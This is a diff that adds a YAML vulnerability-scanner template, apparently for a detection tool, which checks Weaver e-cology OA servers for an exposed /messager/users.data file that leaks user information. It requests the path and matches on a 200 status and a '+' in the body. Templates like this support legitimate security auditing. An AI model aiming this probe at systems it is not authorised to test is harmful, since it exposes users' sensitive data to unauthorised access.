@@ -1,0 +1,25 @@
+info:
+  vulId: weaver_ecology_infoleak
+  detail: 泛微协同办公oa users.data敏感信息泄露
+  fofaQuery:
+rules:
+  - request:
+      payload:
+        - ""
+      path: "{{rootUrl}}/messager/users.data"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - "+"
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
